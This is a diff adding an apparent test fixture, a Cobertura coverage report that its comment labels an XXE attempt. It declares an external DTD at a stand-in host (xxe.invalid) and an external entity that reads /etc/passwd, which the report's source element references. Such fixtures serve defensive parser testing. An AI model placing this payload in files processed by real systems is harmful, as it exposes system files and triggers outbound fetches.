@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!-- An XXE attempt: an external DTD and an external entity, in an otherwise valid Cobertura report. -->
+<!DOCTYPE coverage SYSTEM "http://xxe.invalid/evil.dtd" [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<coverage line-rate="1" branch-rate="1" lines-covered="0" lines-valid="0" version="1.9" timestamp="0">
+  <sources>
+    <source>&xxe;</source>
+  </sources>
+  <packages />
+</coverage>
